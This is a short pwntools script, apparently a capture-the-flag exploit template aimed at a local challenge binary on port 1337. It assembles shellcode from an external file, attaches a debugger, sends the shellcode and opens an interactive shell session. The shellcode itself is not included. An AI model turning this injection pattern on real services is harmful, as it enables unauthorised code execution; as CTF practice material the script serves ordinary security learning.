from pwn import *

HOST, PORT = '0.0.0.0', 1337
BIN_PATH = './chall'

context.arch = 'amd64'
context.log_level = 'debug'
r = remote(HOST, PORT)
r = process(BIN_PATH)

def sla(*args, **kwargs):
  return r.sendlineafter(*args, **kwargs)

def sl(*args, **kwargs):
  return r.sendline(*args, **kwargs)

def win():
  r.sendline(b"./abcd 3")
  r.interactive()

sc = asm(read("sc.asm").decode())
gdb.attach(r)
r.send(sc)

r.interactive()
